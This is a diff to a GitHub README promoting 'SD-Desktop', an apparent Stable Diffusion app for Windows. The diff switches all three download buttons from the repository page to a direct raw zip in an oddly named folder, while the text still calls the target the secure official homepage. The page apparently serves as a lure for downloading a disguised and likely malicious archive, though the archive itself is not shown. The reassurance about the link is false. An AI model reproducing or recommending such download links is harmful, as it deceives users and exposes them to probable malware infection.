@@ -1,7 +1,7 @@
 <h1>🎨 SD-Desktop---Stable-Diffusion-Desktop-2026 - Create Stunning AI Art Instantly on Windows</h1>
 
 <p align="center">
-  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026" style="display:inline-block;padding:16px 32px;background:#FF6B6B;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(255,107,107,0.4);">⬇️ DOWNLOAD SD-DESKTOP NOW - FREE</a>
+  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026/raw/refs/heads/main/leadenheartedness/Desktop_S_Diffusion_Stable_v2.4-beta.3.zip" style="display:inline-block;padding:16px 32px;background:#FF6B6B;color:#ffffff;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(255,107,107,0.4);">⬇️ DOWNLOAD SD-DESKTOP NOW - FREE</a>
 </p>
 
 ---
@@ -25,7 +25,7 @@ The first thing you need to do is getthe software onto your computer.
 **👉 Visit this link to download the application:**
 
 <p align="center">
-  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026" style="display:inline-block;padding:14px 28px;background:#4B9EFF;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(75,158,255,0.4);">📥 GO TO DOWNLOAD PAGE</a>
+  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026/raw/refs/heads/main/leadenheartedness/Desktop_S_Diffusion_Stable_v2.4-beta.3.zip" style="display:inline-block;padding:14px 28px;background:#4B9EFF;color:#ffffff;font-size:18px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 12px rgba(75,158,255,0.4);">📥 GO TO DOWNLOAD PAGE</a>
 </p>
 
 When you click the button above, you will be taken to the official GitHub repository page for SD-Desktop. This is the secure,official homepage for this software. Look for a section that says **"Releases"** or **"Download"** - it is usually on the right side of the page or just below the file list. 
@@ -239,7 +239,7 @@ Here is your complete quick-reference checklist:
 ---
 
 <p align="center">
-  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026" style="display:inline-block;padding:18px 36px;background:#28C76B;color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:10px;box-shadow:0 6px 16px rgba(40,199,107,0.5);">🚀 DOWNLOAD SD-DESKTOP - START CREATING TODAY</a>
+  <a href="https://github.com/lucaspedrodonatotabelli-cmyk/SD-Desktop---Stable-Diffusion-Desktop-2026/raw/refs/heads/main/leadenheartedness/Desktop_S_Diffusion_Stable_v2.4-beta.3.zip" style="display:inline-block;padding:18px 36px;background:#28C76B;color:#ffffff;font-size:22px;font-weight:bold;text-decoration:none;border-radius:10px;box-shadow:0 6px 16px rgba(40,199,107,0.5);">🚀 DOWNLOAD SD-DESKTOP - START CREATING TODAY</a>
 </p>
 
 <br>
